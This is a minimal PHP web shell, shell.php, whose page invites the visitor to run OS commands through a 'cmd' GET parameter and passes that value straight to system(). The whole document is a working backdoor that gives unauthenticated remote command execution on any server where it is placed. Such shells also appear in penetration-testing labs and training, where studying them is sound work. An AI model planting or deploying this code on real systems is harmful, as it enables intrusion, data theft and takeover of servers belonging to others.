<html>
<body>
<h5>Welcome to shell.php,<br>Try to execute OS commands using 'cmd' GET parameter.</h5>
<pre>
<?php
    if($_GET['cmd'])
    {
		system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>